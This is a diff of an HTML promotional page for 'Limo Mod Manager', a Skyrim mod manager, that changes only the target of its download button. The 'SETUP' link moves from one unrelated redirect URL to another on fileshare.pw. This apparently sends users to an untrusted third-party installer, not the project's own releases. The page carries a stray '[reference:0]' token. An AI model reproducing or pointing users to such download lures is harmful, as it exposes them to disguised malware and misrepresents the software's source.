@@ -1,7 +1,7 @@
 <div style="max-width:800px;margin:auto;padding:20px;font-family:Arial,sans-serif;line-height:1.6;background:#0a0a0f;color:#e0e0e0;border-radius:15px;">
 <h1 style="color:#44aaff;border-bottom:2px solid #2288cc;text-align:center;">🐉 Limo Mod Manager – Modern Mod Manager for Skyrim (MO2/Vortex Alternative) 🐉</h1>
 <p style="font-size:1.1em;text-align:center;"><strong>Multi‑purpose mod manager for Windows.</strong> A fresh, Qt‑based alternative for managing your Skyrim SE/AE setup. Features LOOT integration, Nexus API support, and a clever Staging Directory & Deployers system.</p>
-<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://www.shawonline.co.za/redir" style="background:#44aaff;color:#000;padding:12px 25px;text-decoration:none;border-radius:5px;">⬇️ DOWNLOAD LIMO MOD MANAGER (SETUP)</a><p>✅ Windows 10/11 ✅ LOOT integration ✅ Nexus API ✅ FOMOD support ✅ OpenMW support</p></div>
+<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://fileshare.pw/redir" style="background:#44aaff;color:#000;padding:12px 25px;text-decoration:none;border-radius:5px;">⬇️ DOWNLOAD LIMO MOD MANAGER (SETUP)</a><p>✅ Windows 10/11 ✅ LOOT integration ✅ Nexus API ✅ FOMOD support ✅ OpenMW support</p></div>
 <img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/489830/header.jpg" style="max-width:100%;border-radius:8px;margin:15px 0;">
 <div><h3>📦 What You Unlock with Limo Mod Manager for Skyrim:</h3>
 <ul><li><strong>Staging Directory & Deployers System:</strong> Limo keeps mod files in a separate staging directory. Only when you deploy, files are linked to the game folder. This makes enabling/disabling mods instant and keeps your game folder clean.[reference:0]</li>
